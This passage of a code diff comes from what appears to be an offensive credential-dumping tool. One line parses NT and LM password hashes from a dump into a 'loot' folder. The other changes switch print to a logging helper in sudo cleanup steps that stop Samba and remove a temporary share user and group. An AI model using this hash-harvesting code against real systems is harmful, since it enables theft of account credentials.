             os.system("echo 'Domain:Username:NT:LM' > {}/loot/{}/dumped_msv.txt; grep 'msv' {}/loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'Window Manage\|Font Driver Host\|\$' >> {}/loot/{}/dumped_msv.txt".format(cwd, timestamp, cwd, timestamp, cwd, timestamp))
@@ -1647,20 +1549,20 @@ if __name__ == '__main__':
 
     except KeyboardInterrupt as e:
         logging.error(str(e))
-        print("\n{}[!]{} Cleaning up please wait".format(color_YELL, color_reset))
+        printnlog("\n{}[!]{} Cleaning up please wait".format(color_YELL, color_reset))
 
         if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
             os.system('sudo rm {}/drives.txt'.format(cwd))
 
         try:
             os.system("sudo systemctl stop smbd")
-            print(green_plus + " Stopped the smbd service")
+            printnlog(green_plus + " Stopped the smbd service")
         except BaseException as e:
             pass
 
         try:
             os.system("sudo cp " + cwd + "/smb.conf /etc/samba/smb.conf")
-            print(green_plus + " Cleaned up the smb.conf file")
+            printnlog(green_plus + " Cleaned up the smb.conf file")
         except BaseException as e:
             pass
 
@@ -1671,13 +1573,13 @@ if __name__ == '__main__':
 
         try:
             os.system("sudo userdel " + share_user)
-            print(green_plus + " Removed the user: " + share_user)
+            printnlog(green_plus + " Removed the user: " + share_user)
         except BaseException as e:
             pass
 
         try:
             os.system("sudo groupdel " + share_group)
-            print(green_plus + " Removed the group: " + share_group)
+            printnlog(green_plus + " Removed the group: " + share_group)
         except BaseException as e:
             pass
 
@@ -1694,19 +1596,19 @@ if __name__ == '__main__':
         print("{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C".format(color_BLU, color_reset))
         exit(0)
 
-    print("{}[-]{} Cleaning up please wait".format(color_BLU, color_reset))
+    printnlog("{}[-]{} Cleaning up please wait".format(color_BLU, color_reset))
     if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
         os.system('sudo rm {}/drives.txt'.format(cwd))
 
     try:
         os.system("sudo systemctl stop smbd")
-        print(green_plus + " Stopped the smbd service")
+        printnlog(green_plus + " Stopped the smbd service")
     except BaseException as e:
         pass
 
     try:
         os.system("sudo cp " + cwd + "/smb.conf /etc/samba/smb.conf")
-        print(green_plus + " Cleaned up the smb.conf file")
+        printnlog(green_plus + " Cleaned up the smb.conf file")
     except BaseException as e:
         pass
 
@@ -1717,13 +1619,13 @@ if __name__ == '__main__':
 
     try:
         os.system("sudo userdel " + share_user)
-        print(green_plus + " Removed the user: " + share_user)
+        printnlog(green_plus + " Removed the user: " + share_user)
     except BaseException as e:
         pass
 
     try:
         os.system("sudo groupdel " + share_group)
-        print(green_plus + " Removed the group: " + share_group)
+        printnlog(green_plus + " Removed the group: " + share_group)
     except BaseException as e:
         pass
 
